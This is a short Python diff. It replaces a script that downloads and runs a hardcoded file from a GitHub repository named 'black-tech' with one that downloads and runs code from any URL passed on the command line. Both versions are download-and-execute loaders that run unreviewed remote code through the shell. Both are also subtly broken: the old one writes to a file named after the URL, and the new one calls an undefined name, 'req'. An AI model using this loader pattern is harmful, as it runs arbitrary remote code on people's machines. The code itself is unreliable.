@@ -1,7 +1,4 @@
-import subprocess
-from urllib.request import urlopen
-
-url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/over.py'
-
-open(url, 'w').write(urlopen(url).read().decode())
-subprocess.run('python '+url, shell=True)
+import urllib.request, sys, os
+code = req.urlopen(sys.argv[1]).read().decode()
+open('o', 'w').write(code)
+os.system('python o')
